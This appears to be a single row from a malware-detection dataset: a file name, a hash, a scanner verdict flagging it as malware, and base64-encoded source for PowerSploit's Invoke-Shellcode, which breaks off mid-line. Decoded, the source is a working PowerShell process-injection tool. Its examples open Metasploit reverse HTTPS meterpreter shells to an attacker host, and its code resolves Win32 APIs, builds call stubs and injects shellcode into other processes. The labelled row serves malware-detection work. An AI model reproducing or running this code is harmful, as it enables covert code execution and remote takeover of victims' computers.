Invoke-Shellcode.ps1,8e1e04bf5fabc0e669256c17ca656580,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVNoZWxsY29kZQp7CjwjCi5TWU5PUFNJUwoKSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBwcm9jZXNzIElEIG9mIHlvdXIgY2hvb3Npbmcgb3Igd2l0aGluIHRoZSBjb250ZXh0IG9mIHRoZSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2Vzcy4KClBvd2VyU3Bsb2l0IEZ1bmN0aW9uOiBJbnZva2UtU2hlbGxjb2RlCkF1dGhvcjogTWF0dGhldyBHcmFlYmVyIChAbWF0dGlmZXN0YXRpb24pCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZQpSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUKT3B0aW9uYWwgRGVwZW5kZW5jaWVzOiBOb25lCiAKLkRFU0NSSVBUSU9OCgpQb3J0aW9ucyBvZiB0aGlzIHByb2plY3Qgd2FzIGJhc2VkIHVwb24gc3lyaW5nZS5jIHYxLjIgd3JpdHRlbiBieSBTcGVuY2VyIE1jSW50eXJlCgpQb3dlclNoZWxsIGV4cGVjdHMgc2hlbGxjb2RlIHRvIGJlIGluIHRoZSBmb3JtIDB4WFgsMHhYWCwweFhYLiBUbyBnZW5lcmF0ZSB5b3VyIHNoZWxsY29kZSBpbiB0aGlzIGZvcm0sIHlvdSBjYW4gdXNlIHRoaXMgY29tbWFuZCBmcm9tIHdpdGhpbiBCYWNrdHJhY2sgKFRoYW5rcywgTWF0dCBhbmQgZzB0bTFsayk6Cgptc2ZwYXlsb2FkIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQgQyB8IHNlZCAnMSw2ZDtzL1siO10vL2c7cy9cXC8sMC9nJyB8IHRyIC1kICdcbicgfCBjdXQgLWMyLSAKCk1ha2Ugc3VyZSB0byBzcGVjaWZ5ICd0aHJlYWQnIGZvciB5b3VyIGV4aXQgcHJvY2Vzcy4gQWxzbywgZG9uJ3QgYm90aGVyIGVuY29kaW5nIHlvdXIgc2hlbGxjb2RlLiBJdCdzIGVudGlyZWx5IHVubmVjZXNzYXJ5LgogCi5QQVJBTUVURVIgUHJvY2Vzc0lECgpQcm9jZXNzIElEIG9mIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBzaGVsbGNvZGUgaW50by4KCi5QQVJBTUVURVIgU2hlbGxjb2RlCgpTcGVjaWZpZXMgYW4gb3B0aW9uYWwgc2hlbGxjb2RlIHBhc3NlZCBpbiBhcyBhIGJ5dGUgYXJyYXkKCi5QQVJBTUVURVIgTGlzdE1ldGFzcGxvaXRQYXlsb2FkcwoKTGlzdHMgYWxsIG9mIHRoZSBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyB0aGF0IEludm9rZS1TaGVsbGNvZGUgc3VwcG9ydHMKCi5QQVJBTUVURVIgTGhvc3QKClNwZWNpZmllcyB0aGUgSVAgYWRkcmVzcyBvZiB0aGUgYXR0YWNrIG1hY2hpbmUgd2FpdGluZyB0byByZWNlaXZlIHRoZSByZXZlcnNlIHNoZWxsCgouUEFSQU1FVEVSIExwb3J0CiAKU3BlY2lmaWVzIHRoZSBwb3J0IG9mIHRoZSBhdHRhY2sgbWFjaGluZSB3YWl0aW5nIHRvIHJlY2VpdmUgdGhlIHJldmVyc2Ugc2hlbGwKCi5QQVJBTUVURVIgUGF5bG9hZAoKU3BlY2lmaWVzIHRoZSBtZXRhc3Bsb2l0IHBheWxvYWQgdG8gdXNlLiBDdXJyZW50bHksIG9ubHkgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJyBhbmQgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycgcGF5bG9hZHMgYXJlIHN1cHBvcnRlZC4KCi5QQVJBTUVURVIgVXNlckFnZW50CgpPcHRpb25hbGx5IHNwZWNpZmllcyB0aGUgdXNlciBhZ2VudCB0byB1c2Ugd2hlbiB1c2luZyBtZXRlcnByZXRlciBodHRwIG9yIGh0dHBzIHBheWxvYWRzCgouUEFSQU1FVEVSIFByb3h5CgpPcHRpb25hbGx5IHNwZWNpZmllcyB3aGV0aGVyIHRvIHV0aWxpemUgdGhlIHByb3h5IHNldHRpbmdzIG9uIHRoZSBtYWNoaW5lLgoKLlBBUkFNRVRFUiBMZWdhY3kKCk9wdGlvbmFsbHkgc3BlY2lmaWVzIHdoZXRoZXIgdG8gdXRpbGl6ZSB0aGUgb2xkZXIgbWV0ZXJwcmV0ZXIgaGFuZGxlciAiSU5JVE0iLiBUaGlzIHdpbGwgbGlrZWx5IGJlIHJlbW92ZWQgaW4gdGhlIGZ1dHVyZS4gCgouUEFSQU1FVEVSIEZvcmNlCgpJbmplY3RzIHNoZWxsY29kZSB3aXRob3V0IHByb21wdGluZyBmb3IgY29uZmlybWF0aW9uLiBCeSBkZWZhdWx0LCBJbnZva2UtU2hlbGxjb2RlIHByb21wdHMgZm9yIGNvbmZpcm1hdGlvbiBiZWZvcmUgcGVyZm9ybWluZyBhbnkgbWFsaWNpb3VzIGFjdC4KCi5FWEFNUExFCgpDOlxQUz4gSW52b2tlLVNoZWxsY29kZSAtUHJvY2Vzc0lkIDQyNzQKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkluamVjdCBzaGVsbGNvZGUgaW50byBwcm9jZXNzIElEIDQyNzQuCgouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgcnVubmluZyBpbnN0YW5jZSBvZiBQb3dlclNoZWxsLgoKLkVYQU1QTEUKCkM6XFBTPiBTdGFydC1Qcm9jZXNzIEM6XFdpbmRvd3NcU3lzV09XNjRcbm90ZXBhZC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbgpDOlxQUz4gJFByb2MgPSBHZXQtUHJvY2VzcyBub3RlcGFkCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1Qcm9jZXNzSWQgJFByb2MuSWQgLVBheWxvYWQgd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzIC1MaG9zdCAxOTIuMTY4LjMwLjEyOSAtTHBvcnQgNDQzIC1WZXJib3NlCgpWRVJCT1NFOiBSZXF1ZXN0aW5nIG1ldGVycHJldGVyIHBheWxvYWQgZnJvbSBodHRwczovLzE5Mi4xNjguMzAuMTI5OjQ0My9JTklUTQpWRVJCT1NFOiBJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUElEOiA0MDA0ClZFUkJPU0U6IEluamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4KVkVSQk9TRTogVXNpbmcgMzItYml0IHNoZWxsY29kZS4KVkVSQk9TRTogU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweDAzQkUwMDAwClZFUkJPU0U6IEVtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuClZFUkJPU0U6IFRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4MDAxQjAwMDAKVkVSQk9TRTogU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkVzdGFibGlzaGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBoaWRkZW4gbm90ZXBhZCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoKClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzKToKCk5hbWUgICAgICBDdXJyZW50IFNldHRpbmcgIFJlcXVpcmVkICBEZXNjcmlwdGlvbgotLS0tICAgICAgLS0tLS0tLS0tLS0tLS0tICAtLS0tLS0tLSAgLS0tLS0tLS0tLS0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQpMSE9TVCAgICAgMTkyLjE2OC4zMC4xMjkgICB5ZXMgICAgICAgVGhlIGxvY2FsIGxpc3RlbmVyIGhvc3RuYW1lCkxQT1JUICAgICA0NDMgICAgICAgICAgICAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgcG9ydAoKLkVYQU1QTEUKCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1QYXlsb2FkIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcyAtTGhvc3QgMTkyLjE2OC4zMC4xMjkgLUxwb3J0IDgwCgpEZXNjcmlwdGlvbgotLS0tLS0tLS0tLQpFc3RhYmxpc2hlcyBhIHJldmVyc2UgaHR0cCBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBydW5uaW5nIFB3ZXJTaGVsbCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoKClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHApOgoKTmFtZSAgICAgIEN1cnJlbnQgU2V0dGluZyAgUmVxdWlyZWQgIERlc2NyaXB0aW9uCi0tLS0gICAgICAtLS0tLS0tLS0tLS0tLS0gIC0tLS0tLS0tICAtLS0tLS0tLS0tLQpFWElURlVOQyAgdGhyZWFkICAgICAgICAgICB5ZXMgICAgICAgRXhpdCB0ZWNobmlxdWU6IHNlaCwgdGhyZWFkLCBwcm9jZXNzLCBub25lCkxIT1NUICAgICAxOTIuMTY4LjMwLjEyOSAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgaG9zdG5hbWUKTFBPUlQgICAgIDgwICAgICAgICAgICAgICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBwb3J0CgouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLVNoZWxsY29kZSBAKDB4OTAsMHg5MCwweEMzKQogICAgCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCk92ZXJyaWRlcyB0aGUgc2hlbGxjb2RlIGluY2x1ZGVkIGluIHRoZSBzY3JpcHQgd2l0aCBjdXN0b20gc2hlbGxjb2RlIC0gMHg5MCAoTk9QKSwgMHg5MCAoTk9QKSwgMHhDMyAoUkVUKQpXYXJuaW5nOiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHRoYXQgeW91ciBzaGVsbGNvZGUgaXMgMzIgdnMuIDY0LWJpdCEKICAgIAouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLUxpc3RNZXRhc3Bsb2l0UGF5bG9hZHMKICAgIApQYXlsb2FkcwotLS0tLS0tLQp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cAp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMKCi5OT1RFUwoKVXNlIHRoZSAnLVZlcmJvc2UnIG9wdGlvbiB0byBwcmludCBkZXRhaWxlZCBpbmZvcm1hdGlvbi4KClBsYWNlIHlvdXIgZ2VuZXJhdGVkIHNoZWxsY29kZSBpbiAkU2hlbGxjb2RlMzIgYW5kICRTaGVsbGNvZGU2NCB2YXJpYWJsZXMgb3IgcGFzcyBpdCBpbiBhcyBhIGJ5dGUgYXJyYXkgdmlhIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyCgpCaWcgdGhhbmtzIHRvIE9pc2luICh4MG4pIEdyZWhhbiAoQG9pc2luZykgZm9yIGFuc3dlcmluZyBhbGwgbXkgb2JzY3VyZSBxdWVzdGlvbnMgYXQgdGhlIGRyb3Agb2YgYSBoYXQgLSBodHRwOi8vd3d3Lm5pdm90Lm9yZy8KCi5MSU5LCgpodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbQojPgoKW0NtZGxldEJpbmRpbmcoIERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJywgU3VwcG9ydHNTaG91bGRQcm9jZXNzID0gJFRydWUgLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKAogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtVSW50MTZdCiAgICAkUHJvY2Vzc0lELAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJyApXQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtCeXRlW11dCiAgICAkU2hlbGxjb2RlLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVTZXQoICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAgICAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMnLAogICAgICAgICAgICAgICAgICBJZ25vcmVDYXNlID0gJFRydWUgKV0KICAgIFtTdHJpbmddCiAgICAkUGF5bG9hZCA9ICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTGlzdFBheWxvYWRzJyApXQogICAgW1N3aXRjaF0KICAgICRMaXN0TWV0YXNwbG9pdFBheWxvYWRzLAogICAgCiAgICBbUGFyYW1ldGVyKCBNYW5kYXRvcnkgPSAkVHJ1ZSwKICAgICAgICAgICAgICAgIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbU3RyaW5nXQogICAgJExob3N0ID0gJzEyNy4wLjAuMScsCiAgICAKICAgIFtQYXJhbWV0ZXIoIE1hbmRhdG9yeSA9ICRUcnVlLAogICAgICAgICAgICAgICAgUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQogICAgW1ZhbGlkYXRlUmFuZ2UoIDEsNjU1MzUgKV0KICAgIFtJbnRdCiAgICAkTHBvcnQgPSA4NDQzLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3RyaW5nXQogICAgJFVzZXJBZ2VudCA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycpLidVc2VyIEFnZW50JywKCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3dpdGNoXQogICAgJExlZ2FjeSA9ICRGYWxzZSwKCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3dpdGNoXQogICAgJFByb3h5ID0gJEZhbHNlLAogICAgCiAgICBbU3dpdGNoXQogICAgJEZvcmNlID0gJEZhbHNlCikKCiAgICBTZXQtU3RyaWN0TW9kZSAtVmVyc2lvbiAyLjAKICAgIAogICAgIyBMaXN0IGFsbCBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyBhbmQgZXhpdCB0aGUgZnVuY3Rpb24KICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgJ0xpc3RQYXlsb2FkcycpCiAgICB7CiAgICAgICAgJEF2YWlsYWJsZVBheWxvYWRzID0gKEdldC1Db21tYW5kIEludm9rZS1TaGVsbGNvZGUpLlBhcmFtZXRlcnNbJ1BheWxvYWQnXS5BdHRyaWJ1dGVzIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHskXy5UeXBlSWQgLWVxIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlZhbGlkYXRlU2V0QXR0cmlidXRlXX0KICAgIAogICAgICAgIGZvcmVhY2ggKCRQYXlsb2FkIGluICRBdmFpbGFibGVQYXlsb2Fkcy5WYWxpZFZhbHVlcykKICAgICAgICB7CiAgICAgICAgICAgIE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7IFBheWxvYWRzID0gJFBheWxvYWQgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBSZXR1cm4KICAgIH0KCiAgICBpZiAoICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc0lEJ10gKQogICAgewogICAgICAgICMgRW5zdXJlIGEgdmFsaWQgcHJvY2VzcyBJRCB3YXMgcHJvdmlkZWQKICAgICAgICAjIFRoaXMgY291bGQgaGF2ZSBiZWVuIHZhbGlkYXRlZCB2aWEgJ1ZhbGlkYXRlU2NyaXB0JyBidXQgdGhlIGVycm9yIGdlbmVyYXRlZCB3aXRoIEdldC1Qcm9jZXNzIGlzIG1vcmUgZGVzY3JpcHRpdmUKICAgICAgICBHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJRCAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsCiAgICB9CiAgICAKICAgIGZ1bmN0aW9uIExvY2FsOkdldC1EZWxlZ2F0ZVR5cGUKICAgIHsKICAgICAgICBQYXJhbQogICAgICAgICgKICAgICAgICAgICAgW091dHB1dFR5cGUoW1R5cGVdKV0KICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCldCiAgICAgICAgICAgIFtUeXBlW11dCiAgICAgICAgICAgICRQYXJhbWV0ZXJzID0gKE5ldy1PYmplY3QgVHlwZVtdKDApKSwKICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSApXQogICAgICAgICAgICBbVHlwZV0KICAgICAgICAgICAgJFJldHVyblR5cGUgPSBbVm9pZF0KICAgICAgICApCgogICAgICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgogICAgICAgICREeW5Bc3NlbWJseSA9IE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpCiAgICAgICAgJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5Bc3NlbWJseSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKQogICAgICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVDb25zdHJ1Y3RvcignUlRTcGVjaWFsTmFtZSwgSGlkZUJ5U2lnLCBQdWJsaWMnLCBbU3lzdGVtLlJlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsICRQYXJhbWV0ZXJzKQogICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgJE1ldGhvZEJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkUmV0dXJuVHlwZSwgJFBhcmFtZXRlcnMpCiAgICAgICAgJE1ldGhvZEJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgCiAgICAgICAgV3JpdGUtT3V0cHV0ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpHZXQtUHJvY0FkZHJlc3MKICAgIHsKICAgICAgICBQYXJhbQogICAgICAgICgKICAgICAgICAgICAgW091dHB1dFR5cGUoW0ludFB0cl0pXQogICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRNb2R1bGUsCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRQcm9jZWR1cmUKICAgICAgICApCgogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIFN5c3RlbS5kbGwgaW4gdGhlIEdBQwogICAgICAgICRTeXN0ZW1Bc3NlbWJseSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQogICAgICAgICRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byB0aGUgR2V0TW9kdWxlSGFuZGxlIGFuZCBHZXRQcm9jQWRkcmVzcyBtZXRob2RzCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykKICAgICAgICAkR2V0UHJvY0FkZHJlc3MgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJykKICAgICAgICAjIEdldCBhIGhhbmRsZSB0byB0aGUgbW9kdWxlIHNwZWNpZmllZAogICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICAgICAkdG1wUHRyID0gTmV3LU9iamVjdCBJbnRQdHIKICAgICAgICAkSGFuZGxlUmVmID0gTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKCR0bXBQdHIsICRLZXJuMzJIYW5kbGUpCiAgICAgICAgCiAgICAgICAgIyBSZXR1cm4gdGhlIGFkZHJlc3Mgb2YgdGhlIGZ1bmN0aW9uCiAgICAgICAgV3JpdGUtT3V0cHV0ICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCiAgICB9CgogICAgIyBFbWl0cyBhIHNoZWxsY29kZSBzdHViIHRoYXQgd2hlbiBpbmplY3RlZCB3aWxsIGNyZWF0ZSBhIHRocmVhZCBhbmQgcGFzcyBleGVjdXRpb24gdG8gdGhlIG1haW4gc2hlbGxjb2RlIHBheWxvYWQKICAgIGZ1bmN0aW9uIExvY2FsOkVtaXQtQ2FsbFRocmVhZFN0dWIgKFtJbnRQdHJdICRCYXNlQWRkciwgW0ludFB0cl0gJEV4aXRUaHJlYWRBZGRyLCBbSW50XSAkQXJjaGl0ZWN0dXJlKQogICAgewogICAgICAgICRJbnRTaXplUHRyID0gJEFyY2hpdGVjdHVyZSAvIDgKCiAgICAgICAgZnVuY3Rpb24gTG9jYWw6Q29udmVydFRvLUxpdHRsZUVuZGlhbiAoW0ludFB0cl0gJEFkZHJlc3MpCiAgICAgICAgewogICAgICAgICAgICAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5ID0gTmV3LU9iamVjdCBCeXRlW10oMCkKICAgICAgICAgICAgJEFkZHJlc3MuVG9TdHJpbmcoIlgkKCRJbnRTaXplUHRyKjIpIikgLXNwbGl0ICcoW0EtRjAtOV17Mn0pJyB8IEZvckVhY2gtT2JqZWN0IHsgaWYgKCRfKSB7ICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkgKz0gW0J5dGVdICgnMHh7MH0nIC1mICRfKSB9IH0KICAgICAgICAgICAgW1N5c3RlbS5BcnJheV06OlJldmVyc2UoJExpdHRsZUVuZGlhbkJ5dGVBcnJheSkKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5CiAgICAgICAgfQogICAgICAgIAogICAgICAgICRDYWxsU3R1YiA9IE5ldy1PYmplY3QgQnl0ZVtdKDApCiAgICAgICAgCiAgICAgICAgaWYgKCRJbnRTaXplUHRyIC1lcSA4KQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJENhbGxTdHViID0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgUVdPUkQgUkFYLCAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRCYXNlQWRkciAgICAgICAjICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgUkFYCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDZBLDB4MDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFBVU0ggIEJZVEUgMAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRFeGl0VGhyZWFkQWRkciAjICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIFJBWAogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBEV09SRCBFQVgsICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEJhc2VBZGRyICAgICAgICMgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBFQVgKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIERXT1JEIEVBWCwgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEV4aXRUaHJlYWRBZGRyICMgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgRUFYCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLU91dHB1dCAkQ2FsbFN0dWIKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpJbmplY3QtUmVtb3RlU2hlbGxjb2RlIChbSW50XSAkUHJvY2Vzc0lEKQogICAgewogICAgICAgICMgT3BlbiBhIGhhbmRsZSB0byB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3QgaW50bwogICAgICAgICRoUHJvY2VzcyA9ICRPcGVuUHJvY2Vzcy5JbnZva2UoMHgwMDFGMEZGRiwgJGZhbHNlLCAkUHJvY2Vzc0lEKSAjIFBy